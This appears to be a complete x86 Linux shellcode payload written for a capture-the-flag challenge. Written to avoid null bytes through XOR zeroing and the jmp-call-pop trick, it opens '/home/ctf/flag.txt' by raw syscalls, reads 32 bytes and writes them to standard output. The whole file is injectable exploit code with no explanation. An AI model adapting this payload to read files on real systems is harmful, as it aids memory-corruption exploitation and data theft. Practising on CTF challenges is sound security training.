bits 32

xor eax, eax
mov al, 5

jmp getfilename1
getfilename2:

pop ebx
xor ecx, ecx
mov byte [ebx+18], cl

xor ecx, ecx
int 0x80 ; open


push eax ; preserve the handle

xor eax, eax
mov al, 3

pop ebx

mov ecx, esp

xor edx, edx
mov dl, 32
int 0x80 ; read

xor eax, eax
mov al, 4

xor ebx, ebx
inc ebx

mov ecx, esp

xor edx, edx
mov dl, 32
int 0x80 ; write


xor eax, eax
inc eax

xor ebx, ebx

int 0x80


getfilename1:
call getfilename2
  db '/home/ctf/flag.txtZ'
